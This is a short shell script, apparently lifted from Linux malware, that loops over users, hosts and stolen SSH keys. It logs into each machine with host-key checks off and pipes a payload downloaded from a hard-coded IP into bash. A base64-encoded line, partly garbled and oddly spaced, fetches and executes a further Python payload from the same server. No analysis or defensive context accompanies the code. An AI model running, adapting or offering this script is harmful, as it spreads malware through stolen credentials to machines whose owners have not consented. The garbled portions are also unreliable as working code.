for user in $users; do
    for host in $hosts; do
        for key in $keys; do
            chmod +r $key; chmod 400 $key
            ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host "(curl -s http://185.172.128.146:443/2.gif || wget -q -O- http://185.172.128 .146:443/2.gif || lwp-download http://185.172.128.146:443/2.gif /tmp/2.gif) | bash -sh; bash /tmp/2.gif; rm -rf /tmp/2.gif; echo cH10aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4 ZWModXJsbGliLnVybG9wZW40Imh0dHA6Ly8xODUuMTcyLjEyOC4xNDY6NDQzL2QucHkiKS5yZWFkKCkpJyB8fCBweXRob24yIC1jICdpbXBvcnQgdXJsbGliO2V4ZWMo dXJsbGliLnVybG9wZW4oImh0dHA6Ly8xODUuMTcyLjEyOC4xNDYvZC5weSIpLnJIYWQoKSkn | base64 -d | bash -"
        done
    done
done
